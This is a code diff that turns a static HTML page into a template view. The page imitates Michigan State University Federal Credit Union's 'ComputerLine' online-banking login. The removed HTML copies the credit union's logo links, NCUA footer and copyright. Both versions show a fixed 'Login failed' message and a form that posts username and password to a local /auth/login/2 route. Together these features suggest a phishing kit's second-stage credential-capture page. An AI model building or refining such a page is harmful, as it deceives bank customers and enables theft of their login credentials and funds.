@@ -1,82 +1,49 @@
-<!DOCTYPE html>
-<html lang="en">
+@layout('layouts.app')
 
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Login</title>
-  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.js"></script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="header mobile-header">
-      <div class="cb-logo-container">
-        <a href="https://www.msufcu.org/">
-          <img src="/img/logo.svg" class="cb-logo">
-          <img src="/img/logo-small.svg" class="cb-logo-small">
-        </a>
-      </div>
-
-      <h4 class="cb-title">ComputerLine</h4>
-    </div>
-
-    <div class="main">
-      <div class="form-container">
-        <div class="form-error">
-          <span>Login failed. Please try again.</span>
-        </div>
-
-        <form action="/auth/login/2" method="post">
-          <table>
-            <tbody>
-              <tr>
-                <td>Username</td>
-                <td><input name="username" id="username" type="text" class="form-control" autocomplete="off" autocapitalize="off" spellcheck="off" required></td>
-              </tr>
-
-              <tr>
-                <td>Password</td>
-                <td><input name="password" id="password" type="password" class="form-control input-mask" autocomplete="off" autocapitalize="off" spellcheck="off" required>
-                </td>
-              </tr>
-              <tr>
-                <td></td>
-                <td><button type="submit" class="submit-btn">Sign In</button></td>
-              </tr>
-            </tbody>
-          </table>
-        </form>
-      </div>
-    </div>
-
-    <div class="footer">
-      <div class="footer-text">
+@section('content')
+<div class="cb-login-static-alert cb-login-message cb-login-alert-message cb-loginFormArea">
+  <div class="cb-alert-message_container static-alert">
+    <div class="cb-alert cb-alert-msg cb-alert-message_content cb-alert-danger" role="alert" aria-live="assertive">
+      <div class="cb-alert-message_inner" style="line-height: 2.8;">
         <p>
-          <strong>Michigan State University Federal Credit Union</strong> savings are Federally insured to at least $250,000 by the <a href="https://www.ncua.gov/">NCUA</a> and backed by the full faith and credit of the United States Government. APR = Annual Percentage Rate. APY = Annual Percentage Yield. <a href="https://www.msufcu.org/disclosures/?expand=privacy_policy#privacy_policy">View our Privacy Policy</a> and
-          read our <a href="https://media.msufcu.org/publicsites/publicsite/documents/u2slfliv46vtlzftrvw1.pdf">disclaimer</a> regarding links to other sites.
+          <span class="ui-icon icon-warning-sign " aria-hidden="true" aria-label="error"></span>
+          Logon failed. Please try again.
         </p>
-        <div class="copyright">
-          Copyright © 2023 Michigan State University Federal Credit Union All Rights Reserved.
-        </div>
-      </div>
-
-      <div>
-        <a href="https://www.ncua.gov/">
-          <img src="/img/ncua.gif">
-        </a>
-      </div>
-
-      <div>
-        <img src="/img/ehl.png">
+        <p class="cb-alert-message_sizer">X</p>
       </div>
     </div>
   </div>
+</div>
 
-  <script src="/js/main.js"></script>
-</body>
+<div class="cb-login-form cb-loginFormArea">
+  <form class="cb-form" action="/auth/login/2" method="POST">
+    <div class="field">
+      <label class="cb-login-field" for="username">Login ID</label>
+      <input id="username" name="username" class="mrg-T-sm form-control cb-text-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+    </div>
 
-</html>
+    <div class="field">
+      <label class="cb-login-field" for="password">Password</label>
+      <input id="password" name="password" class="mrg-T-sm form-control cb-text-field cb-text-field-mask" type="password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+    </div>
+
+    <div id="userLinks">
+      <div id="rememberUserNameArea">
+        <div class="ui-checkbox">
+          <input class="sr-only" id="ckbRememberUser" type="checkbox">
+
+          <label for="ckbRememberUser">
+            <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20"><rect fill="none" stroke="none" stroke-width="2" x="1" y="1" width="18" height="18" rx="3"></rect><polyline fill="none" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5"></polyline></svg>
+            Remember me
+          </label>
+        </div>
+      </div>
+
+      <button class="logon-submit btn-primary btn-block pointer btn disabled" disabled="">
+        <div class="icon"></div>
+        Log In
+      </button>
+    </div>
+  </form>
+</div>
+@endsection
